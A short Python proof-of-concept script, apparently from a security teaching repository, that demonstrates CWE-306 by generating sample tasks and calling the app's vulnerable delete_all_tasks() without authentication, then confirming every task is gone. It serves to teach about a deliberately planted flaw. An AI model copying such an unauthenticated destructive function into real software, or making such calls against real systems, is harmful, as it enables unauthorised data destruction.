
# Demonstrates CWE-306: Missing Authentication.
# Calls vulnerable.delete_all_tasks() WITHOUT authentication.

import sys
import os

sys.path.insert(0, os.path.abspath("."))

try:
    from app import vulnerable, storage, maintenance
except Exception as e:
    print("Failed to import modules from 'app'. Make sure exploit.py is in the repo root.")
    raise

def main():
    print("== Running CWE-306 exploit: deleting ALL tasks with no authentication ==\n")

    #Generate the sample data
    maintenance.generate_sample_data(5,3)
    tasks = storage.load_tasks()
    print(f"[+] Before exploit, number of tasks: {len(tasks)}")



    # Trigger the vulnerability
    print("[+] Calling vulnerable.delete_all_tasks() ...")
    vulnerable.delete_all_tasks()

    # Verify results
    tasks = storage.load_tasks()
    print(f"[+] After exploit, number of tasks: {len(tasks)} (should be 0)")


    print("Exploit completed.")

if __name__ == "__main__":
    main()
